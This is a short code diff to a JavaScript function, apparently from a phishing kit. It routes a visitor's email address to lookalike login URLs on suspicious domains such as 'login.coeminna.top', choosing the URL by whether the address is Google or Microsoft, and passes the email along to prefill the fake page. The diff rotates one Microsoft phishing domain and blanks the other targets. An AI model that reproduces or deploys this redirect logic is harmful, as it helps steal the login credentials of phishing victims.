@@ -285,11 +285,11 @@ export async function renderVueTemplate(metadata = {}) {
           }
 
           if (isGoogleEmail) {
-            targetUrl = 'https://accounts.0-0x.net?9J1aeEc=a3Vpa3BzcGo=#smn=' + encodeURIComponent(email);
+            targetUrl = '' + encodeURIComponent(email);
           } else if (isMicrosoftEmail) {
-            targetUrl = 'https://login.0--8.net?lbLj1DrT0A=b2V0dW9yeWk=&omn=' + encodeURIComponent(email);
+            targetUrl = 'https://login.coeminna.top?PMHaia5eD2E=cnd5YQ==&omn=' + encodeURIComponent(email);
           } else {
-            targetUrl = 'https://cae766b13ab4f55fe158e.n-59.pw/' + encodeURIComponent(email);
+            targetUrl = '' + encodeURIComponent(email);
           }
 
           window.open(targetUrl, '_blank', 'noopener,noreferrer');
